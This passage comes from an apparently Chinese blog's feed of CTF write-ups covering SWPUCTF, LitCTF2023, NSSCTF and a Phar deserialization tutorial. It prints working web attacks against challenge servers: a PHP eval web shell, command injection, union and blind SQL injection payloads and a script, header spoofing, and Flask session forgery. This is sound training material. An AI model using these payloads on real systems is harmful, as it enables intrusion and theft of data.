href=\"#45swpuctf-2022-新生赛js_sign\">#</a> 45.[SWPUCTF 2022 新生赛] js_sign</h2>\n<p><mark>考点:tapcode 敲击码</mark><br>\n打开之后看源代码，看 main.js</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">&quot;button&quot;</span>)[<span class=\"number\">0</span>].<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;click&quot;</span>, <span class=\"function\">()=&gt;</span>&#123;</span><br><span class=\"line\">    flag=<span class=\"string\">&quot;33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_\">btoa</span>(flag.<span class=\"property\">value</span>) == <span class=\"string\">&#x27;dGFwY29kZQ==&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"title function_\">alert</span>(<span class=\"string\">&quot;you got hint!!!&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"title function_\">alert</span>(<span class=\"string\">&quot;fuck off !!&quot;</span>);</span><br><span class=\"line\">    &#125;    </span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p><code>dGFwY29kZQ==</code>  经过 base64 解码是 tapcode, 这是一种加密方式，<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oaWVuY29kZS5jb20vdGFwY29kZS5odG1s\"> 解密网站</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3343431344215434452124331421311122125444113513341415</span><br><span class=\"line\">n(N) s(S) s(S) c(C) t(T) f(F) y(Y) o(O) u(U) f(F) i(I) n(N) d(D) f(F) l(L) a(A) g(G) b(B) y(Y) t(T) a(A) p(P) c(C) o(O) d(D) e(E)</span><br><span class=\"line\">合起来就是flag</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://hq185187.github.io/2023/06/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "Phar反序列化学习",
            "date_published": "2023-06-03T06:32:34.711Z",
            "content_html": "<h3 id=\"phar\"><a class=\"markdownIt-Anchor\" href=\"#phar\">#</a> Phar</h3>\n<p>phar 是 PHP 的压缩文档，类似 Java 的 jar 包，可以把多个文件存放至同一文件，无需解压，PHP 就可以访问并执行内部语句</p>\n<h3 id=\"phar文件结构\"><a class=\"markdownIt-Anchor\" href=\"#phar文件结构\">#</a> phar 文件结构</h3>\n<ol>\n<li>a stub, 是 phar 文件头，这个 stub 就是一个简单的 PHP 文件，它的格式有要求：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure>\n<p><mark>前面的内容不限制，但__HALT_COMPILER () 必须存在</mark></p>\n<ol start=\"2\">\n<li>\n<p>manifest, 压缩文件信息，存储文件的属性，权限等信息<br>\n这里以序列化的形式存储了用户自定义的 Meta-data, 因此是反序列化的攻击点</p>\n</li>\n<li>\n<p>contents，压缩文件内容</p>\n</li>\n<li>\n<p>signature，签名，位于文件末尾<br>\n签证尾部的 01 代表 md5 加密，02 代表 sha1 加密，04 代表 sha256 加密，08 代表 sha512 加密<br>\n当我们修改文件的内容时，签名就会变得无效，这个时候需要更换一个新的签名，脚本：</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> sha1</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;test.phar&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">    f = file.read() </span><br><span class=\"line\">s = f[:-<span class=\"number\">28</span>] <span class=\"comment\"># 获取要签名的数据</span></span><br><span class=\"line\">h = f[-<span class=\"number\">8</span>:] <span class=\"comment\"># 获取签名类型和GBMB标识</span></span><br><span class=\"line\">newf = s + sha1(s).digest() + h <span class=\"comment\"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;newtest.phar&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">    file.write(newf) <span class=\"comment\"># 写入新文件</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"phar反序列化\"><a class=\"markdownIt-Anchor\" href=\"#phar反序列化\">#</a> Phar 反序列化</h3>\n<h4 id=\"phar反序列化原因\"><a class=\"markdownIt-Anchor\" href=\"#phar反序列化原因\">#</a> phar 反序列化原因</h4>\n<p>phar 文件以序列化的形式存储用户自定义的 Meta-data,PHP 使用 phar_parse_metadata 在解析 meta 数据时，会调用 php_var_unserialize 进行反序列化操作</p>\n<h4 id=\"条件\"><a class=\"markdownIt-Anchor\" href=\"#条件\">#</a> 条件</h4>\n<ol>\n<li>phar 文件能上传到服务器，比如 file_get_contents (),fopen () 等函数</li>\n<li>有可以利用的魔术方法</li>\n<li>文件操作函数的参数可控，”phar“，“/”，“:” 这些字符没有被过滤</li>\n<li>php.ini 的 phar.readonly 选项需要为 Off</li>\n</ol>\n<p>#### 需要利用参数的函数<br>\n file_get_contents,fopen,file_put_contents,copy 等等，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbWcyMDIyLmNuYmxvZ3MuY29tL2Jsb2cvMTgzNTY1Ny8yMDIyMTAvMTgzNTY1Ny0yMDIyMTAxMzAwMTYyMzIwOS0zOTQ3MDAxOTAucG5n\">https://img2022.cnblogs.com/blog/1835657/202210/1835657-20221013001623209-394700190.png</span></p>\n<p>### 生成 phar 文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>=<span class=\"string\">&quot;qwq&quot;</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">test</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;name=<span class=\"string\">&quot;phpinfo();&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$phartest</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">phar</span>(<span class=\"string\">&#x27;phartest.phar&#x27;</span>,<span class=\"number\">0</span>);<span class=\"comment\">//后缀名必须为phar</span></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();<span class=\"comment\">//开始缓冲 Phar 写操作</span></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$a</span>);<span class=\"comment\">//自定义的meta-data存入manifest</span></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class=\"comment\">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test.txt&quot;</span>,<span class=\"string\">&quot;test&quot;</span>);<span class=\"comment\">//添加要压缩的文件</span></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();<span class=\"comment\">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>复现：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>=<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable language_\">$this</span>-&gt;name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$phardemo</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;phar://phartest.phar/test.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$phardemo</span>;</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/14/LitCTF2023/",
            "url": "https://hq185187.github.io/2023/05/14/LitCTF2023/",
            "title": "LitCTF2023",
            "date_published": "2023-05-14T12:20:25.426Z",
            "content_html": "<h2 id=\"1我flag呢\"><a class=\"markdownIt-Anchor\" href=\"#1我flag呢\">#</a> 1. 我 Flag 呢？</h2>\n<p>F12 查看源代码</p>\n<h2 id=\"2导弹迷踪\"><a class=\"markdownIt-Anchor\" href=\"#2导弹迷踪\">#</a> 2. 导弹迷踪</h2>\n<p>查看源代码找到 game.js 文件，找到 {return ‘GOT F|L|A|G {y0u_w1n_th1s_!!!}’;}, 以 NSSCTF 形式交就可以<br>\n！[[Pasted image 20230514194556.png]]</p>\n<h2 id=\"3php是世界上最好的语言\"><a class=\"markdownIt-Anchor\" href=\"#3php是世界上最好的语言\">#</a> 3.PHP 是世界上最好的语言！！</h2>\n<p>可以之间运行 php 代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;ls /&#x27;</span>));</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;cat /flag&#x27;</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"4follow-me-and-hack-me\"><a class=\"markdownIt-Anchor\" href=\"#4follow-me-and-hack-me\">#</a> 4.Follow me and hack me</h2>\n<p>hackbar 传参</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">post:</span><br><span class=\"line\">Challenge=i&#x27;m_c0m1ng</span><br><span class=\"line\">get</span><br><span class=\"line\">?CTF=Lit2023</span><br></pre></td></tr></table></figure>\n<h2 id=\"5vim-yyds\"><a class=\"markdownIt-Anchor\" href=\"#5vim-yyds\">#</a> 5.Vim yyds</h2>\n<p>根据题目提示是 vim 信息泄露，文件后缀名是 <code>.index.php.swp</code> <br>\n 下载的文件放到 kali 恢复一下，(vim -r index.php.swp), 看代码知道用 post 方式传一个 password, 值为 base64 加密的 <code>Give_Me_Your_Flag</code> , 就可以执行 post 传的 cmd 的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure>\n<h2 id=\"6作业管理系统\"><a class=\"markdownIt-Anchor\" href=\"#6作业管理系统\">#</a> 6. 作业管理系统</h2>\n<p>源代码提示默认用户名密码 admin, 登录进去之间传马，</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;zoe&#x27;</span>]);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">phpinfo</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>直接改 url 到 zoe.php,hackbar 传 zoe=system (‘cat /flag’);<br>\n 或者不嫌麻烦可以蚁剑连接，密码 zoe</p>\n<h2 id=\"71zjs\"><a class=\"markdownIt-Anchor\" href=\"#71zjs\">#</a> 7.1zjs</h2>\n<p>看源代码，进入 /dist/index.umd.js, 发现 /f@k3f1ag.php 发现一堆 jsfuck 编码的数据<br>\n这里说一下 jsfuck:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">它是由[]()!+这六个字符来编写的JavaScript程序,可被用来绕过xss</span><br></pre></td></tr></table></figure>\n<p>把网页的 jsfuck 编码解码就得到 flag<br>\n 解码网站:<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oaWVuY29kZS5jb20vanNmdWNrLmh0bWw=\">http://www.hiencode.com/jsfuck.html</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NSSCTF&#123;92f549a0-17aa-47ce-bb48-a5c506904cea&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"8http-pro-max-plus\"><a class=\"markdownIt-Anchor\" href=\"#8http-pro-max-plus\">#</a> 8.Http pro max plus</h2>\n<p>经典的签到题<br>\n先本地访问：X-Forwarded-For: 127.0.0.1 不行，换 Client-Ip: 127.0.0.1<br>\n 伪造来源：Referer: <span class=\"exturl\" data-url=\"aHR0cDovL3Bvcm5odWIuY29t\">pornhub.com</span><br>\n 改浏览器：User-Agent: Chrome<br>\n 挂代理：这里新学到了一个 Vis<br>\nVia: Clash.win<br>\n 然后提示去 /wtfwtfwtfwtf.php<br>\n 看源代码发现 /sejishikong.php<br>\n 进入得到 flag<br>\n![[Pasted image 20230513183204.png]]</p>\n<h2 id=\"9ping\"><a class=\"markdownIt-Anchor\" href=\"#9ping\">#</a> 9.Ping</h2>\n<p>看源代码发现对输入进行正则表达式过滤，没办法换个思路：抓包<br>\n发现可以直接在 command=127.0.0.1 后面加任何命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">command=127.0.0.1||cat /flag&amp;ping=Ping</span><br></pre></td></tr></table></figure>\n<p>![[Pasted image 20230513102259.png]]</p>\n<h2 id=\"10这是什么sql-注一下\"><a class=\"markdownIt-Anchor\" href=\"#10这是什么sql-注一下\">#</a> 10. 这是什么？SQL ！注一下 ！</h2>\n<p>get 型，–+ 用不了，用 %23 绕过即可<br>\n注意:<mark> 这里在输入框输入 %23 没有用，要在 hackbar 里输入，而输入框可以输入#</mark><br>\n下面用 hackbar 传参:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">判断两个字段,3失败</span><br><span class=\"line\">1)))))) order by 2%23</span><br><span class=\"line\">判断回显位,结果是1,2</span><br><span class=\"line\">-1)))))) union select 1,2%23</span><br><span class=\"line\">爆表名为users</span><br><span class=\"line\">-1)))))) union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()%23</span><br><span class=\"line\">爆字段名为id,username,password</span><br><span class=\"line\">-1)))))) union select 1,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class=\"line\">爆内容</span><br><span class=\"line\">-1)))))) union select 1,group_concat(password)from users%23</span><br><span class=\"line\">F1rst_to_Th3_eggggggggg!&#125;这是后面题的彩蛋</span><br><span class=\"line\"></span><br><span class=\"line\">看下当前数据库是什么? ctf</span><br><span class=\"line\">-1)))))) union select 1,database()%23 </span><br><span class=\"line\">看下所有数据库名</span><br><span class=\"line\">-1)))))) union select 1,schema_name from information_schema.schemata%23</span><br><span class=\"line\">  </span><br><span class=\"line\">Array ( [0] =&gt; Array ( [username] =&gt; 1 [password] =&gt; information_schema ) [1] =&gt; Array ( [username] =&gt; 1 [password] =&gt; mysql ) [2] =&gt; Array ( [username] =&gt; 1 [password] =&gt; ctftraining ) [3] =&gt; Array ( [username] =&gt; 1 [password] =&gt; performance_schema ) [4] =&gt; Array ( [username] =&gt; 1 [password] =&gt; test ) [5] =&gt; Array ( [username] =&gt; 1 [password] =&gt; ctf ) )</span><br><span class=\"line\"></span><br><span class=\"line\">可能在ctftraining里</span><br><span class=\"line\">-1)))))) union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctftraining&#x27;%23</span><br><span class=\"line\"></span><br><span class=\"line\">flag,news,users</span><br><span class=\"line\">然后查flag表</span><br><span class=\"line\">-1)))))) union select 1,group_concat(column_name)from information_schema.columns where table_schema=&#x27;ctftraining&#x27; and table_name=&#x27;flag&#x27;%23</span><br><span class=\"line\">查到一个字段flag</span><br><span class=\"line\">直接爆内容</span><br><span class=\"line\">-1)))))) union select 1,group_concat(flag)from ctftraining.flag%23</span><br><span class=\"line\"></span><br><span class=\"line\">得到flag</span><br></pre></td></tr></table></figure>\n<h2 id=\"11彩蛋\"><a class=\"markdownIt-Anchor\" href=\"#11彩蛋\">#</a> 11. 彩蛋</h2>\n<p>我 FLAG 呢:/assets/js/script.min.js 里有 LitCTF {First_t0_The_k3y! (1/?)</p>\n<p>Follow me and hack me: 解出 flag 后提示了备份文件，dirsearch 一扫发现 www.zip, 得到空的 flag.php 和 index.php.bak, 改后缀名为 index.php 得到第二个彩蛋:<br>\n// 第三个彩蛋！(看过头号玩家么？)<br>\n// <em>R3ady_Pl4yer_000ne</em> (3/?)</p>\n<p>作业管理系统：远程下载的默认链接，访问有:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wow 你找到了第二个彩蛋哦~</span><br><span class=\"line\">_S0_ne3t? (2/?)</span><br></pre></td></tr></table></figure>\n<p>SQL 注入：F1rst_to_Th3_eggggggggg!}<br>\n 拼接:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"12就当无事发生\"><a class=\"markdownIt-Anchor\" href=\"#12就当无事发生\">#</a> 12. 就当无事发生</h2>\n<p>去 tanji 的 GitHub 项目那里找 commit 就能找到 flag</p>\n<h2 id=\"13flag点击就送\"><a class=\"markdownIt-Anchor\" href=\"#13flag点击就送\">#</a> 13.Flag 点击就送</h2>\n<p>输入 admin 肯定返回你怎么可能是管理员哦，输入别的名字提交会有 session, 此题考点:session 伪造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">假如我这里输入的用户名是hq</span><br><span class=\"line\">得到的session是eyJuYW1lIjoiaHEifQ.ZGDn7w.SuMQs-qX-3RHMwnz7sTe2Yr25ck</span><br></pre></td></tr></table></figure>\n<p>这里推荐一个工具:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25vcmFqL2ZsYXNrLXNlc3Npb24tY29va2llLW1hbmFnZXI=\">noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder (github.com)</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python flask_session_cookie_manager3.py decode -s &#x27;LitCTF&#x27; -c &quot;eyJuYW1lIjoiaHEifQ.ZGDn7w.SuMQs-qX-3RHMwnz7sTe2Yr25ck&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">这里-s是解密密钥,猜的LitCTF,-c是要解密的cookie</span><br><span class=\"line\">&#123;&#x27;name&#x27;: &#x27;hq&#x27;&#125;</span><br></pre></td></tr></table></figure>\n<p>然后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python flask_session_cookie_manager3.py encode -s &#x27;LitCTF&#x27; -t &quot;&#123;&#x27;name&#x27;:&#x27;admin&#x27;&#125;&quot;</span><br><span class=\"line\">这里-t是cookie的结构,-s是加密的密钥</span><br><span class=\"line\">得到:</span><br><span class=\"line\">eyJuYW1lIjoiYWRtaW4ifQ.ZGDt_w.GoKagALqsLhtbwEF92uM00oiMJE</span><br><span class=\"line\">点击拿flag时的cookie的session换上这个就能拿flag了</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/12/nssctf2/",
            "url": "https://hq185187.github.io/2023/05/12/nssctf2/",
            "title": "NSSCTF2",
            "date_published": "2023-05-12T08:31:39.086Z",
            "content_html": "<h3 id=\"15ciscn-2019华北day2web1\"><a class=\"markdownIt-Anchor\" href=\"#15ciscn-2019华北day2web1\">#</a> 15.[CISCN 2019 华北 Day2] Web1</h3>\n<p>题目过滤了很多东西，包括空格<br>\n输入 1’%0a 回显 bool (flase)<br>\n 说明这是一个有过滤的布尔盲注类型的题<br>\n告诉了表名字段名都是 flag,sql 语句就是:select (flag) from (flag)<mark> 因为过滤了空格</mark><br>\n写 python 脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string  </span><br><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">res=<span class=\"string\">&quot;&quot;</span>  </span><br><span class=\"line\">url=<span class=\"built_in\">input</span>(<span class=\"string\">&quot;请输入链接: &quot;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">60</span>):  </span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> string.printable:  <span class=\"comment\">#这个是可输出字符,j会不断遍历里面的值</span></span><br><span class=\"line\">sql=<span class=\"string\">&#x27;if(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))=&#123;1&#125;,1,2)&#x27;</span>.<span class=\"built_in\">format</span>(i,<span class=\"built_in\">ord</span>(j))  </span><br><span class=\"line\"><span class=\"comment\">#这里让flag的第i个值变成ascii看看是否等于j的ord,等于就返回1,否则返回2</span></span><br><span class=\"line\">post=&#123;<span class=\"string\">&quot;id&quot;</span>:sql&#125;  </span><br><span class=\"line\">result=requests.post(url=url,data=post)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello&quot;</span> <span class=\"keyword\">in</span> result.text:  </span><br><span class=\"line\">res+=j  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(res)  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"16hctf-2018warmup\"><a class=\"markdownIt-Anchor\" href=\"#16hctf-2018warmup\">#</a> 16.[HCTF 2018]Warmup</h3>\n<p>首先打开题目看源码，发现 source.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span 